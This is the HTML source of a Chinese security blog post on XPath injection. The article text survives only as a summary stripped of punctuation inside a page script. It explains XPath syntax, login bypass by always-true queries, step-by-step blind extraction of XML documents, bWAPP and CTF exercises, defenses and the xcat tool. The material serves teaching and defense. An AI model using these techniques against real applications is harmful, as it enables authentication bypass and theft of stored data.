<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>浅析Xpath注入 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="浅析Xpath注入"><meta name="application-name" content="浅析Xpath注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="浅析Xpath注入"><meta property="og:url" content="http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="Xpath注入总结 0x01 什么是Xpath XPath 即为 XML 路径语言，是 W3C  XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。它是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="Xpath注入总结 0x01 什么是Xpath XPath 即为 XML 路径语言，是 W3C  XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。它是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/08/06/qian-xi-xpath-zhu-ru/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '浅析Xpath注入',
  postAI: '',
  pageFillDescription: 'Xpath注入总结, 0x01 什么是, 0x02 Xpath的简单演示, 0x03 Xpath基础语法, 0x04XPath注入的定义, 0x05 xpath注入原理, 0x06 下面动手实操(以下都是跟着佬做的), Xpath实例1, Xpath实例二, xpath 实列原理三, 0x07 XPath盲注的方法, 0x08 XPath攻击的实列, 0x09 xpath之bwapp实例一, 0x10 XPath之bwapp实例二, 0x11 xpath挖掘利用, 0x12浅谈XPath注入检测思路和方法, 0x13 经典xpath源码, 0x14 xpath危害, 0x15 xpath防御, 0x16 xpath工具注入总结什么是即为路径语言是标准的主要元素它是一种用来确定标准通用标记语言的子集文档中某部分位置的语言它是一种用来在内存中导航整个树的语言它的设计初衷是作为一种面向和的语言后来独立成了一种标准基于的树状结构有不同类型的节点包括元素节点属性节点和文本节点提供在数据结构树中找寻节点的能力可用来在文档中对元素和属性进行遍历使用路径表达式来选取文档中的节点或者节点集这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似一句话总结的作用就是用于在或中查找信息就像语句的作用是在数据库中查询信息一样的简单演示语法的简单展示在中文档被作为节点树对待中有七种结点类型元素属性文本命名空间处理指令注释以及文档节点或成为根节点选取此节点的所有节点从根节点选取表示选取所有的子元素不考虑其在文档的位置选取当前节点选取当前节点的父节点选取属性或匹配任何属性节点匹配任何元素节点函数匹配一个属性开始位置的关键字匹配一个属性值中包含的字符串匹配的是显示文本信息代码示例张三李四这里根节点是像或者这些都可以叫元素节点这些事属性节点上边是一个简单的文档那么接下来用来查语句这里用语言举例但这里不知为何我的运行不了可能版本不匹配了张三李四选所有选第一个值的文本所有元素第二个也就是李四那个选它的文本以下是大佬的成功展示案例通过这里我们可以体会到类似于查询的感觉基础语法查询基本语句这是一个查询语句获取为的所有数据用户需要提交正确的和才能返回结果如果黑客在字段中输入并在中输入就能绕过校验成功获取所有数据节点类型在中文档被作为节点树对待中有七种结点类型元素属性文本命名空间处理指令注释以及文档节点或称为根节点文档的根节点即是文档结点对应属性有属性结点元素有元素结点元素属性文本命名空间处理指令注释根节点例如下面的文档根节点元素节点属性节点下面是一个匹配节点的实例路径表达式结果限定语限定语是对路径表达式的附加条件用来查找某个特定的节点或者包含某个指定的值的节点限定语被嵌在方括号中路径表达式结果通配符通配符可用来选取未知的元素实例更多细节参考注入注入的定义注入攻击是指利用解析器的松散输入和容错特性能够在表单或其它信息上附带恶意的查询代码以获得权限信息的访问权并更改这些信息注入攻击是针对服务应用新的攻击方法它允许攻击者在事先不知道查询相关知识的情况下通过查询得到一个文档的完整内容注入攻击本质上和注入攻击是类似的都是输入一些恶意的查询等代码字符串从而对网站进行攻击注入发生在当站点使用用户输入的信息来构造请求以获取数据攻击者对站点发送经过特殊构造的信息来探究站点使用的是如何构造的从而进一步获取正常途径下无法获取的数据当数据被用作账户验证时攻击者还可以提升他的权限注入原理注入的原理其实和注入很像注入攻击主要是通过构建特殊的输入这些输入往往是语法中的一些组合这些输入将作为参数传入应用程序通过执行查询而执行入侵者想要的操作但是注入的对象不是数据库表了而是一个存储数据的文件攻击者可以获取数据的组织结构或者访问在正常情况下不允许访问的数据如果数据被用于用户认证那么攻击者就可以提升他的权限因为不存在访问控制所以我们不会遇到许多在注入中经常遇到的访问限制中没有访问控制或者用户认证如果用户有权限使用查询并且之间没有防御系统或者查询语句没有被防御系统过滤那么用户就能够访问整个文档注入出现的位置也就是等下面以登录验证中的模块为例说明注入攻击的实现原理在应用程序的登录验证程序中一般有用户名和密码两个参数程序会通过用户所提交输入的用户名和密码来执行授权操作若验证数据存放在文件中其原理是通过查找表中的用户名和密码的结果来进行授权访问例存在文件如下则在中其典型的查询语句如下但是可以采用如下的方法实施注入攻击绕过身份验证如果用户传入一个和例如和则该查询语句将返回但如果用户传入类似的值那么该查询语句也会得到返回值因为查询语句最终会变成如下代码这个字符串会在逻辑上使查询一直返回并将一直允许攻击者访问系统攻击者可以利用在应用程序中动态地操作文档攻击完成登录可以再通过注入技术获取最高权限帐号和其它重要文档信息延展开来的注入还有很多花样像是通过函数实现报错注入还有的盲注下面动手实操以下都是跟着佬做的实例主流脚本语言都支持对的处理下面我以来学习注入的原理代码很简单实现了一个简单的登陆验证功能其实和注入相似没有对用户输入的数据做过滤导致攻击者可以直接注入表达式只要知道用户名就能绕过密码验证如果用户名没法得知可以用两个来绕过验证逻辑实例二这里用一道赛题来举例通过访问下载网页源码首先看到他过滤了注入的一些关键字中有一段加密的密文解码后得到的是根据提示不是唯一的注入方式再结合下面对的一系列操作可以确定这道题是用注入于是根据这一句可构造如下这个中的不太懂这句的意思是闭合了前后的单引号同时执行三个操作其中第二个操作即是关键点列出文档中的所有元素最后拿到浅浅分析一下这里用的原因是为了让该查询语句返回因为前后均为假而会返回文档所有元素因此为真实列原理三这边有个存放分数的文件查询分数的是获取文件里面的数据构造语句这里用这个函数来访问那个存分数的文件然后用语法去查询数据会语言的慢慢看重要可加深理解不会的跳过先看效果他说只有三个用户那我们来查查的分数吧好了反过来看看代码它是怎么实现对文件的查询的图中框这个就相当于中的语句这就是路径选取节点的语句直接解释查询语句匹配到所有节点这节点不止一个到底要哪个呢接收到用户名字来查询相应的节点就是刚才的刚才节点下的节点这时候问题又来了节点不止一个哪个呢函数第一个参数给出节点名第二个写字符串意思就是匹配出他的子节点中信息含有的那个已经找到相应的了然后就是找分数了就是存放分数的节点这样就能实现从文件中查询相应数据了盲注的方法盲注主要利用的一些字符串操作函数和运算符以前文的环境为例如果我们想遍历出整个文档一般步骤如下判断根下节点数体现出来的就是回显正常以下均是猜解第一级节点判断的下一级节点数猜解的下一级节点重复上述步骤直到猜解出所有节点最后来猜解节点中的数据或属性值猜解为的节点下的值攻击的实列一般说来大多数应用程序使用关系数据库存储和检索信息例如如果您的站点需要身份验证那么您可能拥有一个表其中包含惟一登录名密码也许还有一些其他信息比如角色从表中检索用户的查询可能类似于清单清单从表中检索用户的查询在这个查询中用户必须提供和作为输入如果攻击者在字段中输入并在中输入则形成的查询将类似清单清单从攻击者输入形成的查询这个条件会一直匹配因此攻击者可以进入系统注入的原理大体类似但是假设您拥有的不是一个表而是一个文件其中包含了如清单所示的用户信息在中类似于查询的语句如清单所示清单匹配查询的语句要执行类似的攻击以绕过身份验证如果攻击者在字段中输入并在中输入您可能会使用类似清单的方法清单绕过身份验证您可能在应用程序中有一个诸如之类的方法使用清单中的文档再次执行身份验证可能类似于清单清单之实例一我们来看看上的第一个注入这个登录界面访问权限是通过去读取文件来实现的换句话说你输入账号密码他就把文件里的合法账号密码拿出来和你填写的进行比对如果一致就通过如果他对输入没有进行过滤的话用注入的万能钥匙是能通过的通过这个我们了解到和注入还是有点像的起码能用进阶探索看一道注入的题目在中找到提示信息意思是不是唯一的注入因此我们想到注入用这样爆出所有查询结果并不能找到看来只能拿出特有的注入手段了这也是和注入最大的区分直接看好了这一部分只需要了解注入和注入不是一个东西就行之实例二再来看看的第二个注入这个应用是你给出类型他查找这个类型的电影给你呈现出来这里我选了动作片他告诉我图中结果看就知道这里是通过来传参的简单测试下语句没有回显正常应该有回显看样子是接收参数的位置问题不是任何位置都可以接受比如在函数里那我们试试继续还是不行不要灰心拼字游戏就是如此我们来看看一个查询语句这是之前查分数的这里接收参数的位置是在中括号里面用来挑选某个节点属性因此用中括号闭合成功这里不行会不会是哪个函数里面接收参数那就是括号把中括号换成圆括号也不行就在我郁闷的时候一拍脑袋函数一般是放在中括号里用来增加查询条件的这有点像那么试试这里对这个的理解第一个前面啥也查不到因此转到中间的语句返回文档中所有元素接着又查询第三个虽然查不到但前面有即返回文档中所有元素挖掘利用如果一个网站某应用程序将数据保存在中并且对用户的输入没有做限制攻击者提交了没有经过处理的输入就插入到查询中即产生注入那么就攻击者就可能通过控制查询获取数据或者删除数据之类的操作是路径语言用于配置文件的查找数据库就是文件因此只要是利用语法的应用程序如果未对输入的查询做严格的处理都会存在注入漏洞比如一些登录地址页面搜索页面需要与交互的位置判断依据主要根据错误信息页面判断以及查看源码进行分析首先这是这个方式请求验证因此对的参数进行注入测试发现报错信息说明是可能通过存储于前端交互然后构造查询语句因此或者等使其为真可以通过查看源码然后构造回显出浅谈注入检测思路和方法不是保存企业数据的但是很多情况下都用来保存应用程序配置数据小型应用程序也保存简单信息例如角色权限等等下面给出一个的列子原理类似注入构建新的查询逻辑来进行攻击但是要注意关键词像函数这种的区分大小写构建新的逻辑实现注入一个字节一个字节的提取出信息返回正常则判断正确等同于下面的查询通过查询名字的输入却查询到了了的密码首位尝试攻击每一个字符位置并测试每一个可能的值获得密码当然了大部分情况下我们不能够知道任何节点的名称或者说只能知道一部分可使用盲注相当于盲注大家都对语句嫩熟于心不多提了首先提取父节点的名字正常正常父节点名字为是元素节点提取子节点名字正常正常二号子节点名称为提取子节点的值基于原理的但是这个不会输出我们通过布尔型来查询所有的内容正常正常第二个子节点值为测试步骤提交这些看能否使得状态改变返回子节点数量状态状态改变数字型参数状态改变确定了存在注入点用上面的方法注入就可以了经典源码从源码可知查询语句为且经过关键字替换但是黑名单中都为关键字所以并不影响对进行注入我们可以构造如来进行注入获取文档中的所有元素节点危害在及表单中提交恶意代码可获取到权限限制数据的访问权并可修改这些数据可通过此类漏洞查询获取到系统内部完整的文档内容逻辑以及认证被绕过它不像数据库那样有各种权限没有各种权限的概念正因为没有权限概念因此利用构造查询的时候整个数据库都会被用户读取的具体危害下面我将从这两个方面来分别演示这两种危害绕过验证首先这里有一个登录身份验证的程序所有的身份数据都存储在一个名为的文件里通过查询文件将用户提交的用户名和密码与文件中的用户名密码做比对来验证身份的结构如下一般情况下输入错误的用户名或密码会导致身份认证失败然而在后台的身份认证程序中有这样一句查询语句可以看到在查询语句中并未对用户的输入做任何处理这就直接导致一个注入点我们可以构造如下的那么整个查询语句就变成了这个样子整个查询语句恒成立就直接导致了身份认证被绕过信息泄露大多数情况下当服务器返回数据时都会对这些数据做一些处理比如如果服务器返回一些错误信息那么最终会被过滤掉不会出现在用户的页面里将尽可能少的信息暴露给用户将可以提高安全性但是即使错误信息被过滤掉我们依然可以从服务器给出的不同返回结果推测出服务器做出了何种响应作为攻击者可以提交一段包含函数的通过服务器给出的不同响应判断得到我们想知道的信息这就是盲注下面这是一个通过用户名的来得到用户名的程序当然具体场景也可能是通过名字来查询身份证号码等等这里只做演示正常情况下输入用户的就会得到相应的用户名当查询语句恒成立时如构造为时就会返回第一个节点的用户名这是程序本身的而当查询语句错误或该在数据库中不存在时就什么都不返回利用这点我们就可以构造如下比如来查询整个文档的根节点的第一个字母是否为返回结果为就说明整个文档的根节点的第一个字母是反之如果什么都没有返回则说明根节点的第一个字母不是以此类推我们就可以历遍整个文档了这也是和其他数据库相比最大的威胁所在了因为它没有访问控制和身份验证防御数据提交到服务器上端在服务端正式处理这批数据之前对提交数据的合法性进行验证检查提交的数据是否包含特殊字符对特殊字符进行编码转换或替换删除敏感字符或字符串如过滤等全部过滤像单双引号这类可以对这类特殊字符进行编码转换或替换对于系统出现的错误信息以错误编码信息替换屏蔽系统本身的出错信息或者用统一的报错页面代替如这类参数化查询将需要构建的查询表达式以变量的形式表示变量不是可以执行的脚本如下代码可以通过创建保存查询的外部文件使查询参数化通过等加密算法对于数据敏感信息和在数据传输过程中加密即使某些非法用户通过非法手法获取数据包看到的也是加密后的信息验证是否包含特定的函数可以过滤掉一些函数以提高安全性当然了不能以牺牲用户体验或影响用户正常使用为前提总结下就是限制提交非法字符对输入内容严格检查过滤参数化查询的变量工具是一个用来利用盲注的命令行程序它可以用来检索正在被易受攻击的查询处理的整个文档读取主机文件系统上的任意文件并利用无限制的请求使服务器直接向发送数据带外通信是的命令行程序利用的注入漏洞在应用中检索文档下载地址使用说明环境常用命令读取文件这命令老了我现在也不知道现版本咋用有时间研究吧注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-06 15:50:29',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 